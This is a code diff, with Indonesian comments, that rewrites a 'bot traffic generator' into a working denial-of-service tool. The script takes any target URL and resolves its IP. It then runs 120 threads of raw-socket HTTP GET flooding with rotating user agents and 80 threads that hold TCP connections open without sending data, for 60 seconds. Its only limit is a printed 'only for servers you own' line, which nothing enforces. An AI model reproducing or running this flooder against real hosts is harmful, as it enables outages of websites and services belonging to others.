@@ -1,117 +1,109 @@
 #!/usr/bin/env python3
-"""
-🔥 Bot Traffic Generator - Versi Diperkuat
-Selamat datang di menu saya!
-(Hanya untuk pengujian internal pada website milik sendiri!)
-"""
-
-import requests
+import socket
 import threading
 import time
-import logging
-import sys
 import random
+import sys
 from urllib.parse import urlparse
 
-# Setup logging
-logging.basicConfig(
-    level=logging.INFO,
-    format='[%(asctime)s] %(message)s',
-    datefmt='%H:%M:%S'
-)
-
-# Daftar User-Agent umum (untuk variasi)
-USER_AGENTS = [
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
-    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15",
-    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
+# Daftar User-Agent realistis
+UAS = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15",
+    "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36"
 ]
 
-def validate_url(url):
+def resolve_ip(host):
     try:
-        result = urlparse(url)
-        return all([result.scheme in ["http", "https"], result.netloc])
+        return socket.gethostbyname(host)
     except:
-        return False
+        print("❌ Gagal resolve domain!")
+        sys.exit(1)
 
-def send_bot_traffic(url, bot_id, requests_per_bot, delay):
-    """Fungsi untuk satu 'bot' mengirim banyak request (tanpa session reuse)"""
-    for i in range(requests_per_bot):
+def http_flood(host, port, path, duration):
+    end = time.time() + duration
+    while time.time() < end:
         try:
-            headers = {
-                "User-Agent": random.choice(USER_AGENTS),
-                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-                "Accept-Language": "en-US,en;q=0.5",
-                "Accept-Encoding": "gzip, deflate",
-                "Connection": "close",  # Tutup koneksi tiap request → lebih banyak koneksi baru
-                "Upgrade-Insecure-Requests": "1",
-            }
-            # Tidak pakai session → tiap request benar-benar baru
-            resp = requests.get(
-                url,
-                headers=headers,
-                timeout=5,          # Timeout lebih ketat
-                allow_redirects=True,
-                stream=False
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(3)
+            s.connect((host, port))
+            req = (
+                f"GET {path} HTTP/1.1\r\n"
+                f"Host: {host}\r\n"
+                f"User-Agent: {random.choice(UAS)}\r\n"
+                f"Accept: text/html,application/xml;q=0.9,*/*;q=0.8\r\n"
+                f"Accept-Language: en-US,en;q=0.9\r\n"
+                f"Accept-Encoding: gzip, deflate\r\n"
+                f"Connection: keep-alive\r\n"
+                f"\r\n"
             )
-            logging.info(f"Bot-{bot_id:02d} → {url} | Status: {resp.status_code}")
-        except Exception as e:
-            # Cukup log ringkas, jangan ganggu alur
-            logging.debug(f"Bot-{bot_id:02d} → Error: {type(e).__name__}")
+            s.send(req.encode())
+            # JANGAN TUTUP → tahan sebentar biar beban naik
+            time.sleep(0.5)
+            s.close()
+        except:
+            pass
 
-        if delay > 0:
-            time.sleep(delay)
-        # Jika delay = 0 → kirim secepat mungkin!
+def tcp_hold(host, port, duration):
+    end = time.time() + duration
+    while time.time() < end:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(2)
+            s.connect((host, port))
+            # Tahan koneksi tanpa kirim data
+            time.sleep(random.uniform(5, 12))
+            s.close()
+        except:
+            pass
 
 def main():
-    print("🤖 Selamat datang di menu saya!")
+    print("Haloo Rapipp")
     print("=" * 40)
+    url = input(" target website: ").strip()
 
-    # Input target
-    while True:
-        target = input("🔗 Masukkan target website (contoh: http://192.168.1.10): ").strip()
-        if validate_url(target):
-            break
-        print("❌ URL tidak valid! Gunakan format: http:// atau https://")
+    if not url.startswith(("http://", "https://")):
+        url = "http://" + url
 
-    # Input jumlah bot & request
-    try:
-        num_bots = int(input("👾 Jumlah 'bot' (misal: 50): ") or "50")
-        req_per_bot = int(input("📨 Request per bot (misal: 100): ") or "100")
-        delay = float(input("⏱️  Delay antar request per bot (0 = secepatnya): ") or "0")
-    except ValueError:
-        print("⚠️  Input tidak valid. Menggunakan nilai default.")
-        num_bots, req_per_bot, delay = 50, 100, 0
+    parsed = urlparse(url)
+    host = parsed.hostname
+    port = 443 if parsed.scheme == "https" else 80
+    path = parsed.path or "/"
 
-    print(f"\n🚀 Memulai serangan bot...")
-    print(f"🎯 Target: {target}")
-    print(f"🧍 Jumlah bot: {num_bots} | Total request: {num_bots * req_per_bot}")
-    print(f"⚡ Delay: {'Tidak ada (mode cepat!)' if delay == 0 else f'{delay} detik'}")
-    print("-" * 50)
-    print("ℹ️  Log hanya menampilkan request sukses. Error disembunyikan agar tidak membanjiri layar.")
-    if delay == 0:
-        print(f"⚠️  {num_bots} thread akan mengirim request SECEPAT MUNGKIN!\n")
+    if not host:
+        print("❌ URL tidak valid!")
+        return
 
-    # Jalankan bot dalam thread
+    ip = resolve_ip(host)
+    print(f"\n🎯 Target: {url}")
+    print(f"🌐 Resolved IP: {ip}")
+    print(f"⚡ Mode: HTTP Flood + TCP Hold")
+    print(f"🧶 Thread: 200 | Auto-loop selama 60 detik")
+    print(f"\n⚠️  HANYA UNTUK SERVER YANG KAMU MILIKI!\n")
+    time.sleep(3)
+
+    # Jalankan 120 thread HTTP flood + 80 thread TCP hold
     threads = []
-    for bot_id in range(1, num_bots + 1):
-        t = threading.Thread(
-            target=send_bot_traffic,
-            args=(target, bot_id, req_per_bot, delay)
-        )
-        t.daemon = True  # Agar berhenti saat Ctrl+C
+    for _ in range(120):
+        t = threading.Thread(target=http_flood, args=(ip, port, path, 60))
+        t.daemon = True
+        threads.append(t)
+        t.start()
+
+    for _ in range(80):
+        t = threading.Thread(target=tcp_hold, args=(ip, port, 60))
+        t.daemon = True
         threads.append(t)
         t.start()
 
     try:
-        # Tunggu semua selesai
-        for t in threads:
-            t.join()
-        print("\n✅ Semua bot selesai bekerja.")
+        print("💥 GEBUG DIMULAI — Tahan 60 detik...")
+        time.sleep(60)
+        print("\n✅ Selesai.")
     except KeyboardInterrupt:
-        print("\n🛑 Dihentikan oleh pengguna.")
+        print("\n🛑 Dihentikan.")
 
 if __name__ == "__main__":
     main()
